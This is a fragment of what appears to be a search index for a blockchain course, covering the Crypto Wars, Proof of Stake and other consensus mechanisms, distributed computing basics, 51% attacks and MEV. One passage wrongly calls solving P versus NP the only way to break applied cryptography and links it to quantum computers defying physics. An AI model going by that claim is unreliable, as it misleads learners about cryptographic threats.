90s, the NSA [US National Security Agency] classed cryptography as a munition and imposed strict limits on civilian access to strong crypto. They said, \"We can't afford to have the criminals go dark, they're going to hide behind crypto and we won't be able to spy on them.\" In the face of all that resistance, we finally came up with a winning argument. We went to the [US Federal Courts] and said, \"We believe that the first amendment of the US Constitution, which guarantees the right to free speech protects [citizens' access to strong cryptography]. Code is a form of expressive speech in the framework of the US Constitution.\" And this worked. The reason you folks can use [strong cryptography] is because we won this case. As we mentioned previously, asymmetric cryptography presents an enormous challenge to larger structures of power, particularly those tasked with national security. The inability of governments to \"crack\" high-end public key encryption is an unusual position for these institutions. In fact, there are documented attempts of public institutions such as the NSA to create \"backdoors\" into public key cryptography protocols. Crucial to note in these \"backdoor\" attempts is that the math itself behind public key cryptography is not being compromised. What would actually be compromised is the way in which the math is being used by a piece of software. It's the difference between saying a criminal organization has \"hacked\" the Ethereum blockchain protocol (unlikely) versus a criminal organization has \"hacked\" a popular Ethereum software client (less unlikely). It's nearly impossible to build a \"backdoor\" into a concept, like public key cryptography. However, it is possible to compromise a popular piece of software that implements that concept. This is why it is critical that blockchain projects are open-source and very careful about the ways they handle sensitive data for users (like private keys). We'll get into that more when we discuss MetaMask's LavaMoat initiative and general security for working in the blockchain space. Now, we said it's \"nearly impossible\" to build a backdoor into a concept like public key cryptography. The one way in which applied cryptography could be broken is if someone is able to solve what's called the \"P versus NP\" problem ( video explainer ) It's way too complicated to get into now, but essentially if someone could build a machine that defies the traditional physics underlying modern computation it would break our society's cryptographic systems. Theoretically, it's possible this could happen with quantum computers. But, while that technology has made recent advancements, it's far from where it needs to be. Last note, it's highly unlikely (not impossible) quantum computing is being developed secretly by a nation-state as the engineering, resources and conceptual breakthroughs required for its development are considered beyond the capacity of a world government. Exciting times! If you'd like to read more about the Cypherpunk movement, you can read this article from Wired magazine in 1993 ( archived version here ).","title":"History of the Crypto Wars"},{"location":"S01-fundamentals/M1-cryptography/L8-crypto-wars-history/#additional-links","text":"Article: NSA Efforts to Evade Encryption Technology Damaged U.S. Cryptography Standard A piece about the NSA attempts to build a backdoor into cryptographic standards in the 1990s. Article: \"Crypto Rebels\" (Wired, 1993) This is the article Doctorow mentions in his talk providing more description about the events surrounding encryption in the 1990s. Wiki: The Hitchhiker's Guide to Online Anonymity Nervous about privacy from governments? This is an extremely detailed guide to walkthrough how to maintain anonymity online. Spoiler alert: it is quite challenging!","title":"Additional Links"},{"location":"S01-fundamentals/M1-cryptography/L8a-crypto-wars-video/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L8a-crypto-wars-video/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L1-consensus-intro/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L1-consensus-intro/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L10-alt-consensus/","text":"More Forms of Consensus We've spoken mainly about Proof of Work, since it's the current consensus mechanism for Bitcoin and Ethereum, as well as other blockchains. However, there are other consensus protocols being used by blockchain networks, such as: Proof of Stake A consensus protocol based on financial holdings of validator nodes in the network (similar to miner nodes in Proof of Work). Proof of Stake requires much less energy to run than Proof of Work and, for this reason, Ethereum is currently working towards this consensus mechanism. Delegated Proof of Stake This is a variant of the Proof of Stake protocol in which stakeholders can elect validators to represent them in the system. Proof of Authority This is a more traditional consensus mechanism like Raft's leader-led consensus in which only certain nodes are allowed to produce blocks at their discretion. It's meant for smaller, perhaps private networks where the participants all know each other or for lower-stake networks such as testnets or networks securing trivial amounts of value. Why would we need another consensus mechanism for blockchains, if Proof of Work is so innovative? A few reasons: - Accessibility The barriers to entry to becoming a PoW miner are high. Proof of Work chains require a substantial amount of energy to maintain. A miner must purchase, set up, and maintain all the necessary hardware to run a PoW mining rig. Additionally, PoW mining is extremely energy-intensive. - Centralization Barriers to entry for mining can have the adverse secondary effect of greater centralization of miners. As it gets more costly and less profitable to become a miner, the network naturally sees a concentration of mining into two categories. First, large mining conglomerates that operate in areas with low electricity costs and cold weather (to reduce the cost of manually cooling mining hardware) such as Mongolia and Siberia. Second, mining power is centralized in the hands of mining pools. As it becomes less profitable for most people to mine individually, they buy hash power from a mining pool, which operates as a single mining entity. By the end of 2019, over 50% of blocks on Ethereum were mined by just two mining pools. Proof of Stake Proof of Stake is a different kind of consensus mechanism blockchains can use to agree upon a single true record of data history. Whereas in Proof of Work miners expend energy (electricity) to mine blocks into existence, in Proof of Stake validators commit stake to attest (or \u2018validate\u2019) blocks into existence. Validators are the participants on the network who run nodes (called validator nodes ) to propose and attest blocks on a Proof of Stake network. They do so by staking crypto on the network and make themselves available to be randomly selected to propose a block. Other validators then \u201cattest\u201d that they have seen the block. When a sufficient number of attestations for the block has been collected, the block is added to the blockchain. Validators receive rewards both for successfully proposing blocks (just as they do in Proof of Work) and for making attestations about blocks that they have seen. The crypto-economic incentives for Proof of Stake are designed to create more compelling rewards for proper behavior and more severe penalties for malicious behavior. The core crypto-economic incentive boils down to the requirement that validators stake their own crypto\u2013\u2013i.e. money\u2013\u2013on the network. Instead of considering the secondary cost of electricity to run a Proof of Work node, validators on Proof of Stake chains are forced to directly deposit a significant monetary amount onto the network. Validators accrue rewards for making blocks and attestations when it is their turn to do so. They are penalized for not following through with their responsibilities when it is their turn to do so \u2013 i.e. if they are offline. Penalties for being offline are relatively mild and equate to about the same as the expected rewards over time. So, if a validator is participating correctly more than half the time then her rewards will be net positive. Should a validator attempt to attack or compromise the blockchain by trying to propose a new set of data history, however, a different penalty mechanism kicks in: a substantial portion of their staked amount will be slashed (possibly up to the whole amount of stake) and they will be ejected from the network. The result is a tremendous financial risk of a failed attack by a validator. To draw an analogy to Proof of Work, it would be as if a miner who failed an attack on a PoW chain was forced to burn down her entire mining rig instead of just eating the cost of the electricity she spent on a failed attack. Furthermore, this architecture places the security of the network directly in the hands of those maintaining the network and holding its native crypto-asset in the protocol itself. Proof of Stake is used most notably in Ethereum 2.0 (more on that later) and other blockchain networks such as Cardano , EOS and PolkaDot . It's also used in Layer 2 solutions such as Polygon Proof of Stake (we'll discuss Layer 2 solutions later as well) It's important to note that a blockchain network does not have to use Proof of Work in their consensus mechanism. Bitcoin and Ethereum currently use it, but that does not mean it's the only game on the block! Additional Material Wiki: Consensus Mechanisms (Ethereum.org) Article: What is Proof of Stake (ConsenSys)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L10-alt-consensus/#more-forms-of-consensus","text":"We've spoken mainly about Proof of Work, since it's the current consensus mechanism for Bitcoin and Ethereum, as well as other blockchains. However, there are other consensus protocols being used by blockchain networks, such as: Proof of Stake A consensus protocol based on financial holdings of validator nodes in the network (similar to miner nodes in Proof of Work). Proof of Stake requires much less energy to run than Proof of Work and, for this reason, Ethereum is currently working towards this consensus mechanism. Delegated Proof of Stake This is a variant of the Proof of Stake protocol in which stakeholders can elect validators to represent them in the system. Proof of Authority This is a more traditional consensus mechanism like Raft's leader-led consensus in which only certain nodes are allowed to produce blocks at their discretion. It's meant for smaller, perhaps private networks where the participants all know each other or for lower-stake networks such as testnets or networks securing trivial amounts of value. Why would we need another consensus mechanism for blockchains, if Proof of Work is so innovative? A few reasons: - Accessibility The barriers to entry to becoming a PoW miner are high. Proof of Work chains require a substantial amount of energy to maintain. A miner must purchase, set up, and maintain all the necessary hardware to run a PoW mining rig. Additionally, PoW mining is extremely energy-intensive. - Centralization Barriers to entry for mining can have the adverse secondary effect of greater centralization of miners. As it gets more costly and less profitable to become a miner, the network naturally sees a concentration of mining into two categories. First, large mining conglomerates that operate in areas with low electricity costs and cold weather (to reduce the cost of manually cooling mining hardware) such as Mongolia and Siberia. Second, mining power is centralized in the hands of mining pools. As it becomes less profitable for most people to mine individually, they buy hash power from a mining pool, which operates as a single mining entity. By the end of 2019, over 50% of blocks on Ethereum were mined by just two mining pools.","title":"More Forms of Consensus"},{"location":"S01-fundamentals/M2-consensus/L10-alt-consensus/#proof-of-stake","text":"Proof of Stake is a different kind of consensus mechanism blockchains can use to agree upon a single true record of data history. Whereas in Proof of Work miners expend energy (electricity) to mine blocks into existence, in Proof of Stake validators commit stake to attest (or \u2018validate\u2019) blocks into existence. Validators are the participants on the network who run nodes (called validator nodes ) to propose and attest blocks on a Proof of Stake network. They do so by staking crypto on the network and make themselves available to be randomly selected to propose a block. Other validators then \u201cattest\u201d that they have seen the block. When a sufficient number of attestations for the block has been collected, the block is added to the blockchain. Validators receive rewards both for successfully proposing blocks (just as they do in Proof of Work) and for making attestations about blocks that they have seen. The crypto-economic incentives for Proof of Stake are designed to create more compelling rewards for proper behavior and more severe penalties for malicious behavior. The core crypto-economic incentive boils down to the requirement that validators stake their own crypto\u2013\u2013i.e. money\u2013\u2013on the network. Instead of considering the secondary cost of electricity to run a Proof of Work node, validators on Proof of Stake chains are forced to directly deposit a significant monetary amount onto the network. Validators accrue rewards for making blocks and attestations when it is their turn to do so. They are penalized for not following through with their responsibilities when it is their turn to do so \u2013 i.e. if they are offline. Penalties for being offline are relatively mild and equate to about the same as the expected rewards over time. So, if a validator is participating correctly more than half the time then her rewards will be net positive. Should a validator attempt to attack or compromise the blockchain by trying to propose a new set of data history, however, a different penalty mechanism kicks in: a substantial portion of their staked amount will be slashed (possibly up to the whole amount of stake) and they will be ejected from the network. The result is a tremendous financial risk of a failed attack by a validator. To draw an analogy to Proof of Work, it would be as if a miner who failed an attack on a PoW chain was forced to burn down her entire mining rig instead of just eating the cost of the electricity she spent on a failed attack. Furthermore, this architecture places the security of the network directly in the hands of those maintaining the network and holding its native crypto-asset in the protocol itself. Proof of Stake is used most notably in Ethereum 2.0 (more on that later) and other blockchain networks such as Cardano , EOS and PolkaDot . It's also used in Layer 2 solutions such as Polygon Proof of Stake (we'll discuss Layer 2 solutions later as well) It's important to note that a blockchain network does not have to use Proof of Work in their consensus mechanism. Bitcoin and Ethereum currently use it, but that does not mean it's the only game on the block!","title":"Proof of Stake"},{"location":"S01-fundamentals/M2-consensus/L10-alt-consensus/#additional-material","text":"Wiki: Consensus Mechanisms (Ethereum.org) Article: What is Proof of Stake (ConsenSys)","title":"Additional Material"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/","text":"Consensus Conclusion Hopefully by now you feel like you have a sense of how distributed consensus works in a traditional network and how blockchains have innovated consensus protocols. While cryptographic primitives allow blockchain users to secure and validate current transactions, blockchain consensus protocols allow for a blockchain network to maintain a public ledger (the global state of the blockchain) in a decentralized way. Challenges of Consensus in Distributed Networks While blockchain consensus protocols have made great strides in decentralized networks, there are still some unsolved issues they're facing. Some of these (like the CAP theorem and forks) affect all general distributed networks while others, like Miner Extracted Value and 51% attacks, are specific to public blockchains. Here's a sampling and brief description of these challenges. Forks As we mentioned in a previous section, Proof of Work and other blockchain consensus mechanisms can lead to network forks (Note: In general computing networking, forks are also called partitions ). Some of these forks are voluntary (such as network upgrades), accidental (a node receives two valid but different new blocks) or adversarial (network participants purposefully breakaway from the main network to create a separate chain). While forks are common in all distributed systems, with blockchain networks they can be particuarly painful despite also serving as necessary update mechanisms. Network Size The Scalability Trilemma details the different elements a blockchain needs to balance when it grows. Maintaining scalability and security relies on keeping the network size manageable. If the network size is too large, the equipment needed to run a full node is too much for an individual and leads to the enormous mining rigs we now see with Proof of Work blockchains. There are developments with Ethereum clients, like Geth's snapshots , which reduce the amount of space needed for clients. There is also a push for light clients, or clients that can run on mobile phones or a browser. CAP Theorem This is a fairly technical concept and can be challenging to understand. To put it simply, the CAP Theorem states that when a distributed network forks (also called a partition ), the network must either sacrifice consistency or availability. For example, if a blockchain network forks / partitions into two separate chains, you cannot expect those chains to both continue to mine new transactions ( Availability ) and stay consistent ( Consistency ) with each other. You don't need to be an expert in the CAP theorem, really just be aware of its existence and generally how it affects distributed networks. If you'd like to learn more, please see the links in \"Additional Material\" below. Scalability As we've mentioned before, blockchain consensus mechanisms, particularly Proof of Work, are limited by the amount of transactions they can process. If the block size (the amount of transactions processed) increases, then mining will become more centralized and only available to those with significant resources. However, the current transaction throughput (the amount of transactions processed) is not enough to compete against current mainstream financial payment mechanisms. There are significant challenges, mainly how to make Ethereum more light-client friendly. Meaning: how can we reduce the amount of resources needed to provide decentralized consensus? 51% attacks In \"11. Calculations\" of the Bitcoin whitepaper, Nakamoto discusses the possibility of something called a \"51% attack\". This is the mathematical possibility of a malicious actor, who controls 51% or more of the network's hash rate, to both reorder some recent blocks and create a new, valid block including those tampered transactions. To be clear, this has not happened with Bitcoin or any major network, but it does exist as a possibility. Also, controlling 51% of a network's hash rate is only the entrance fee for doing such an attack. It also requires an enormous amount of coordination and subversion to make sure the attack is not noticed. Last, Proof of Work provides an economic incentive for the malicious actor with over 51% of the mining rate to actually produce valid blocks, rather than trying a re-organization attack. Miner Extracted Value This is a more recent concern in the Ethereum community and may be too technical for this part of the course so no worries if you don't get this yet. Put simply, a user may increase the miner's fee of a transaction to entice a miner to include the transaction in a block. That user can use this \"frontrunning\" effect to target users making sophisticated trades. With the increasing sophistication of Ethereum transactions, many feel MEV poses as serious issue to the ecosystem. Please see links below for more resources if you're interested. Conclusion Blockchain consensus protocols, as kicked off by Proof of Work but including Proof of Stake and others, are the last primitive we need in our mental model to complete our blockchain framework. Now that we have both cryptography and distributed computing in our toolkit, we will now see how we can build a generalizable framework to understanding almost any blockchain network we encounter. Additional Material Introductory Article: The Meaning of Decentralization Article: Sharding Discusses the scalability trilemma Release Notes: Geth 1.10.0 Describes the snapshot feature implemented in Geth Reddit: Making Ethereum More Lightclient Friendly Article: The CAP Theorem (Dean Eigenmann) Another great post from the Distributed Systems newsletter describing the CAP theorem in a general way. Dean discusses how CAP theorem is particularly important with e-commerce like Amazon. Article: The CAP FAQ A nice introductory article requiring some network knowledge. Article: Eth2 Vision: The Challenge of Decentralized Scaling Scroll down a bit to see a diagram showing the \"scalability trilemma\" Forum: How to Make the Ecosystem more Light-Client Friendly A Reddit discussion about Ethereum light-clients from 2021. Article: What Everyone Gets Wrong about 51% Attacks (Dankrad Feist) General discussion around 51% attacks, what they are, what they're not, and how Proof of Stake creates checkpoints which could avoid an adversarial re-organization attack. Article: Flashbots: Frontrunning the MEV Crisis A great introductory discussion by the Flashbots research group dedicated to issue of Miner Extracted Value. Interactive: Explore MEV in Real-time A visualization put together by Flashbots to document what they call MEV in real-time. Article: Why Ethereum\u2019s MEV Problem Is Way Worse Than You Think Opinion article describing the potential future problems facing Ethereum if it doesn't address Miner Extracted Value issues. Video: WTF is MEV? Introduction to Miner Extracted Value from Charlie Noyes at a MEV Summit. This video starts at his talk but also includes the rest of the summit, which you don't have to watch! Video: MEV Walkthrough with FlashBots Another walkthrough of MEV from Flashbots Advanced: Distributed Systems Wiki: Distributed Systems Reading List Strong technical and academic discussion around distributed systems Article: How Complex Systems Fail A series of simple statements referring to the management of chaos in complex systems. Highly generalized, but still has a number of gems. Tutorial: Building a Distributed Turn-Based Game System Fun tutorial around using distributed system language Elixir. Wikipedia: Beer Distribution Game A cute, general educational game teaching about the challenges of a distributed system using a common supply chain scenario. Wiki: Sharding FAQ (Ethereum Foundation) First mention of the \"scalability trilemma\" a bit technical, however! Article: You Can't Sacrifice Partition Tolerance Code: \"11. Calcuations\" Bitcoin whitepaper The section where Nakamoto describes the race conditions needed to achieve a 51% attack. Academic Article: Flash Boys 2.0 An in-depth discussion of the Miner Extracted Value theory. Wiki: Resources from Flashbots about MEV Article: Ethereum is a Dark Forest A long narrative account describing white-hat hackers attempt to frontrun the frontrunners. A good primary account of the challenges of Miner Extracted Value.","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#consensus-conclusion","text":"Hopefully by now you feel like you have a sense of how distributed consensus works in a traditional network and how blockchains have innovated consensus protocols. While cryptographic primitives allow blockchain users to secure and validate current transactions, blockchain consensus protocols allow for a blockchain network to maintain a public ledger (the global state of the blockchain) in a decentralized way.","title":"Consensus Conclusion"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#challenges-of-consensus-in-distributed-networks","text":"While blockchain consensus protocols have made great strides in decentralized networks, there are still some unsolved issues they're facing. Some of these (like the CAP theorem and forks) affect all general distributed networks while others, like Miner Extracted Value and 51% attacks, are specific to public blockchains. Here's a sampling and brief description of these challenges. Forks As we mentioned in a previous section, Proof of Work and other blockchain consensus mechanisms can lead to network forks (Note: In general computing networking, forks are also called partitions ). Some of these forks are voluntary (such as network upgrades), accidental (a node receives two valid but different new blocks) or adversarial (network participants purposefully breakaway from the main network to create a separate chain). While forks are common in all distributed systems, with blockchain networks they can be particuarly painful despite also serving as necessary update mechanisms. Network Size The Scalability Trilemma details the different elements a blockchain needs to balance when it grows. Maintaining scalability and security relies on keeping the network size manageable. If the network size is too large, the equipment needed to run a full node is too much for an individual and leads to the enormous mining rigs we now see with Proof of Work blockchains. There are developments with Ethereum clients, like Geth's snapshots , which reduce the amount of space needed for clients. There is also a push for light clients, or clients that can run on mobile phones or a browser. CAP Theorem This is a fairly technical concept and can be challenging to understand. To put it simply, the CAP Theorem states that when a distributed network forks (also called a partition ), the network must either sacrifice consistency or availability. For example, if a blockchain network forks / partitions into two separate chains, you cannot expect those chains to both continue to mine new transactions ( Availability ) and stay consistent ( Consistency ) with each other. You don't need to be an expert in the CAP theorem, really just be aware of its existence and generally how it affects distributed networks. If you'd like to learn more, please see the links in \"Additional Material\" below. Scalability As we've mentioned before, blockchain consensus mechanisms, particularly Proof of Work, are limited by the amount of transactions they can process. If the block size (the amount of transactions processed) increases, then mining will become more centralized and only available to those with significant resources. However, the current transaction throughput (the amount of transactions processed) is not enough to compete against current mainstream financial payment mechanisms. There are significant challenges, mainly how to make Ethereum more light-client friendly. Meaning: how can we reduce the amount of resources needed to provide decentralized consensus? 51% attacks In \"11. Calculations\" of the Bitcoin whitepaper, Nakamoto discusses the possibility of something called a \"51% attack\". This is the mathematical possibility of a malicious actor, who controls 51% or more of the network's hash rate, to both reorder some recent blocks and create a new, valid block including those tampered transactions. To be clear, this has not happened with Bitcoin or any major network, but it does exist as a possibility. Also, controlling 51% of a network's hash rate is only the entrance fee for doing such an attack. It also requires an enormous amount of coordination and subversion to make sure the attack is not noticed. Last, Proof of Work provides an economic incentive for the malicious actor with over 51% of the mining rate to actually produce valid blocks, rather than trying a re-organization attack. Miner Extracted Value This is a more recent concern in the Ethereum community and may be too technical for this part of the course so no worries if you don't get this yet. Put simply, a user may increase the miner's fee of a transaction to entice a miner to include the transaction in a block. That user can use this \"frontrunning\" effect to target users making sophisticated trades. With the increasing sophistication of Ethereum transactions, many feel MEV poses as serious issue to the ecosystem. Please see links below for more resources if you're interested.","title":"Challenges of Consensus in Distributed Networks"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#conclusion","text":"Blockchain consensus protocols, as kicked off by Proof of Work but including Proof of Stake and others, are the last primitive we need in our mental model to complete our blockchain framework. Now that we have both cryptography and distributed computing in our toolkit, we will now see how we can build a generalizable framework to understanding almost any blockchain network we encounter.","title":"Conclusion"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#additional-material","text":"","title":"Additional Material"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#introductory","text":"Article: The Meaning of Decentralization Article: Sharding Discusses the scalability trilemma Release Notes: Geth 1.10.0 Describes the snapshot feature implemented in Geth Reddit: Making Ethereum More Lightclient Friendly Article: The CAP Theorem (Dean Eigenmann) Another great post from the Distributed Systems newsletter describing the CAP theorem in a general way. Dean discusses how CAP theorem is particularly important with e-commerce like Amazon. Article: The CAP FAQ A nice introductory article requiring some network knowledge. Article: Eth2 Vision: The Challenge of Decentralized Scaling Scroll down a bit to see a diagram showing the \"scalability trilemma\" Forum: How to Make the Ecosystem more Light-Client Friendly A Reddit discussion about Ethereum light-clients from 2021. Article: What Everyone Gets Wrong about 51% Attacks (Dankrad Feist) General discussion around 51% attacks, what they are, what they're not, and how Proof of Stake creates checkpoints which could avoid an adversarial re-organization attack. Article: Flashbots: Frontrunning the MEV Crisis A great introductory discussion by the Flashbots research group dedicated to issue of Miner Extracted Value. Interactive: Explore MEV in Real-time A visualization put together by Flashbots to document what they call MEV in real-time. Article: Why Ethereum\u2019s MEV Problem Is Way Worse Than You Think Opinion article describing the potential future problems facing Ethereum if it doesn't address Miner Extracted Value issues. Video: WTF is MEV? Introduction to Miner Extracted Value from Charlie Noyes at a MEV Summit. This video starts at his talk but also includes the rest of the summit, which you don't have to watch! Video: MEV Walkthrough with FlashBots Another walkthrough of MEV from Flashbots","title":"Introductory"},{"location":"S01-fundamentals/M2-consensus/L11-consensus-conclusion/#advanced-distributed-systems","text":"Wiki: Distributed Systems Reading List Strong technical and academic discussion around distributed systems Article: How Complex Systems Fail A series of simple statements referring to the management of chaos in complex systems. Highly generalized, but still has a number of gems. Tutorial: Building a Distributed Turn-Based Game System Fun tutorial around using distributed system language Elixir. Wikipedia: Beer Distribution Game A cute, general educational game teaching about the challenges of a distributed system using a common supply chain scenario. Wiki: Sharding FAQ (Ethereum Foundation) First mention of the \"scalability trilemma\" a bit technical, however! Article: You Can't Sacrifice Partition Tolerance Code: \"11. Calcuations\" Bitcoin whitepaper The section where Nakamoto describes the race conditions needed to achieve a 51% attack. Academic Article: Flash Boys 2.0 An in-depth discussion of the Miner Extracted Value theory. Wiki: Resources from Flashbots about MEV Article: Ethereum is a Dark Forest A long narrative account describing white-hat hackers attempt to frontrun the frontrunners. A good primary account of the challenges of Miner Extracted Value.","title":"Advanced: Distributed Systems"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/","text":"Distributed Coordination: Consensus Protocols After learning about cryptography, we know how to create an identity, how to make sure no one has messed with a file, and how to capture a user's intent all in a decentralized peer-to-peer way. This is all well and good for current interactions or things we are doing now on a network, but how do we agree on things that have happened in the past? That is, how do actors in a network we coordinate and agree on the series of events that have led to the current state of the network? How do we know someone really does have digital money they can send to us and are not making it up? How do all the actors in the network then maintain that knowledge in a secure way? This is what we're going to learn in this module. To understand how all the actors in a network can coordinate and agree about the historical state of a blockchain network we will learn about consensus . Distributed consensus is not only used in blockchain, to be clear. Any internet service that needs to coordinate their servers all over the globe (which is all the major internet services) uses distributed consensus mechanisms to make that happen. Blockchain takes traditional distributed consensus one step further. We'll see what that step is once we understand the historical and fundamental principles of distributed computing. (Note: In this section, we will use the terms Distributed Computing , Distributed Systems , Distributed Consensus , and Distributed Coordination interchangeably. We'll also be speaking about consensus strictly in the computer scientific sense. Later in the course, we'll discuss consensus among people in a network, typically called governance .) Development of Distributed Computing Distributed Computing became an important field of study in the 1970s when airplanes started using electronic control systems. Airline manufacturers wanted to make sure that if a certain part of the electronics gave out while the plane was in the air, the whole plane wouldn't shut down. In the scenario of an airplane, the \"bad actor\" is not a hacker trying to purposefully disable the entire airplane, but rather a single part that is not behaving as it should. As a result, researchers began researching and developing consensus protocols for the airplane computer systems. At the most basic level, \"consensus protocols are used to allow computers to work together\" and \"let different servers agree on the state of a system.\" ( Software Engineering Daily ). For the airplane manufacturers, a good consensus protocol would continue to function with some errors. This way, if one or two things failed, the entire system wouldn't fail. The ability of a consensus protocol to adapt to failure is called resilience. Crucially, early work around distributed computing and consensus protocols dealt with non-adversarial systems . This meant that any of the faults that were happening in a computer network, like an airplane, were the result of natural system errors (power failure, faulty parts, etc), not some sort of active meddling or hacking. This has now developed to encompass much more than aerospace technology. As we mentioned before, it now also covers many digital services, such as: * Any multi-party real-time communication stream (like a social media feed) * An online media streaming service which requires multiple regional servers holding and updating the exact same information on customers * A search engine service that needs to maintain and update indexed information across many regions Consensus protocols help these systems maintain historical information also called state. Broadly speaking, state can be defined as a set of variables describing a certain system at a specific time. Let\u2019s describe that in a real-world situation. Take a look around at whatever environment you\u2019re in\u2013\u2013bus station, coffee shop, office\u2013\u2013and pick out a few variables you could use to describe it. If you\u2019re inside a room, you could describe any number of things: * The number of walls * The types of furniture * The placement of furniture * The number of people * The kind of light in the room Taken all together, these variables will paint a picture of the room. And if things change (say, you turn off a light), we'll update \"The kind of light in the room\" variable, which changes the state. If multiple people needed to maintain a record about the state of our room, we'd have to find a way to communicate this state change. Consensus protocols help us do exactly that: agree on a sequential series of system state which allows all network participants adhering to the consensus protocol to have a similar understanding of the historical changes adding up to the current network state. For a distributed computer network, state typically involves technical information about critical actors in a system. For a social media site, the state includes when a user logged in, what they did, where they were, etc. For an airplane or spaceship, the state includes current status of different parts of the ship, fuel or energy levels, temperature or atmospheric data, etc. As each individual actor in the network uses the consensus protocol to propagate the changes they're doing locally and update their own state based on updates they're getting from others, a historical understanding of the system begins to emerge from these state changes. This coordination of state among multiple actors in a common system allows for many interesting systems, including many of the digital services we use today. Please note that we're using terms like \"actors\" or \"participants\" to describe the active parties in a distributed system. Despite the name, these traditionally refer to machines or computers in a network more commonly called nodes . It can be confusing but just try to remember these are general models we're discussing. Once we get into application and practice, it may be easier to understand. A distributed system where multiple actors are using a consensus protocol to maintain state can be called a state machine or finite state machine. This is fairly technical, but it simply requires us to expand our understanding of a machine, which we typically think of as a metal box containing small electronics connected by circuits. \"State machine\" allows us to consider larger systems, such as a cellphone network or all the electronic parts comprising an airplane, as themselves being machines comprised of nodes consistently maintaining a global state among themselves without a central point of failure. Along with state, distributed consensus relies on a few concepts, such as: Nodes In a strict technical sense, a node is defined as \"an electronic device that is attached to a network, and is capable of creating, receiving, or transmitting information over a communication channel.\" Distributed systems are comprised of nodes. We also call nodes participants or actors. Nodes typically fall into three categories: Leaders (nodes responsible for proposing values), Acceptors (nodes that receive values from Leader and accept them), Processors (nodes that do some operations or processing on received values) ( source ). These roles are not exclusive, a single node may take on one, two, or all three roles. Message Propagation A node can update its state in a distributed network exclusively through messages. How those messages pass or propagate through the network is a critical part of maintaining state. If a node cannot pass a message through a network, there cannot be a unified state that all network nodes agree on. How nodes in a network propagate their messages is known as its topology. Centralized systems, as shown below, can quickly distribute messages. However, they aren't particularly resilient (if the single central node collapses, so does the network). As a result, distributed systems have developed their own peer-to-peer protocols. Below is a famous diagram showing centralized, decentralized and distributed network topologies: Time The notion of time is very important in a distributed system as it creates a sort of order for the larger system. Ordering events that occur in a system is particularly important. Think about making breakfast, for example. If you mix up the order of a series of actions, like eating your eggs before you cook them, it can create chaos and confusion. Here's an article from Dean Eigenmann discussing the concept of Time, Clocks, and Order in distributed systems. Periods Related to the idea of time, every consensus protocol requires discrete periods of activity. Perhaps a node is waiting to hear from a leader, perhaps a series of transactions are being prepared for a block, perhaps the nodes are passing around the latest agreed-upon state. These periods are critical to any consensus protocol. In blockchain systems, these periods typically revolve around the creation and propagation of transactions in a block. Fault Tolerance This is a formal description of resilience: How many mistakes can a system tolerate before it will collapse completely? Put another way, how many bad nodes can we have in a system before the system ceases to propagate state? Leslie Lamport proposed a subset of fault tolerance called Byzantine Fault Tolerance. We discussed it briefly in the video before. Essentially, the most amount of fault a distributed network can absorb is one-third. So, if 2/3rds of a system are still available and coordinating, the system can still run. Because of this famous thought experiment, you may see fault tolerance referred to as Byzantine Fault tolerance or Practical Byzantine Fault Tolerance. However, it's similar to how a rectangle is not a square but a square is a rectangle: Not all fault tolerance is Byzantine fault tolerance. We'll discuss more of this later in the section on trustless consensus. Please note: Distributed consensus outside of blockchain only deals with systems that are non-adversarial meaning all the nodes trust each other. This means the only errors that would show up would be from things like power failures or misbehaving parts, etc. You would not attribute malice to any misbehaving actor. Blockchain's big innovation, which we'll discuss later, was the creation of consensus protocols in adversarial networks in which you must assume everyone is out to get you. This is what we call trustless consensus . Conclusion In our search for the primitives underlying blockchain technology, consensus holds an important piece by allowing a network to have a memory of its own history, which we are calling state. We saw how cryptography allowed us to ensure peer-to-peer authenticity in the moment. Consensus protocols allow us to \"save\" that authenticity across time by facilitating the coordination of all network nodes around a global state. It also allows new participants (nodes) to enter the system and get \"up to date\" on what has happened previously in the system. The next section is an excellent overview of a basic consensus protocol system called Raft. Raft is a simplified consensus algorithm which we feel makes it more approachable to understand. However, Raft is a production-ready consensus protocol used by such major projects as MongoDB. The website The Secret Lives of Data has created an extraordinary walkthrough of Raft, which we hope will illustrate consensus in a concrete way. Additional Links Basic Interactive: Raft: Understandable Distributed Consensus A really excellent, interactive walkthrough of the Raft consensus protocol, a basic consensus protocol. The simple and easy way in which the tutorial walks through the consensus mechanism will help you understand how consensus protocols work on a practical level. Article: Let's Take a Crack at Understanding Distributed Consensus (Preethi Kasireddy) Article Series: Distributed Systems Digest (Dean Eigenmann) This is an excellent series of articles discussing distributed systems, in an approachable way. If you click \"Let me read it first,\" you can access the articles. Podcast: Distributed Systems with Ethan Buchman (Software Engineering Daily) An overview on distributed systems, including the history of their development Article: Want to Really Understand Blockchain? You Need to Understand State (ConsenSys) Article: A Brief Overview of Kademlia and Its Use In Various Decentralized Platforms The Kademlia protocol is a peer-to-peer file sharing system used by many decentralized systems, including Ethereum. Article: Nodes and Links (Explained from First Principles) Interactive Code: BitTorrent Simulator A very cool visualization of how files are distributed over BitTorrent, which uses peer-to-peer file sharing Wikipedia: Consensus Methods, Distributed Computing, Network Resilience, Fault Tolerance, Network State, Byzantine Fault Tolerance State Machines, Peer-to-Peer Protocols, Gossip Protocol Advanced Course: Distributed Systems Textbook: Foundations of Distributed Consensus and Blockchains (Elaine Shi) An advanced and extremely technical but comprehensive view on distributed consensus as it pertains to blockchain development. Academic Article: Leslie Lamport's Byzantine Generals Problem Article: Times, Clocks and Ordering (Leslie Lamport) GitHub: Notes for Dean Eigenmann's Article \"Times, Clocks and Ordering\" GitHub: P2P Workshops This site has a series of exercises to learn about building P2P 